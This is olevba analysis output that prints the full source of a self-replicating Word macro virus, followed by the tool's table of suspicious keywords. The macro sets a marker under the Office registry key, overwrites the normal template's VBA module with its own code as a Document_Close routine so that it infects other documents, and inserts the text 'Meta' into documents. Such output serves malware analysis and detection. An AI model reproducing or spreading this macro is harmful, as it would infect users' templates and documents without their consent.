olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-1a1d924a9d8a66e8060cb73ab36ee3dc41a757eb
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-1a1d924a9d8a66e8060cb73ab36ee3dc41a757eb 
in file: Virus.MSOffice.Source-1a1d924a9d8a66e8060cb73ab36ee3dc41a757eb - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub test()
BIY
IKW
'3
'Some kind of instruction here
'1
'This instr. doesn't care where it is put
'Det2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP"
'Inf2
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
Set char1 = Templates(1)
char1.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, char1.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close"
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, nam1
Next ik
char1.Save
End If
'Def1
If Not ActiveDocument.Content.Find.Execute(FindText:="Meta") Then
Selection.TypeText Text:="Meta"
End If
'2
'Another instr. here
End Sub
Sub IKW()
End Sub
Sub BIY()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

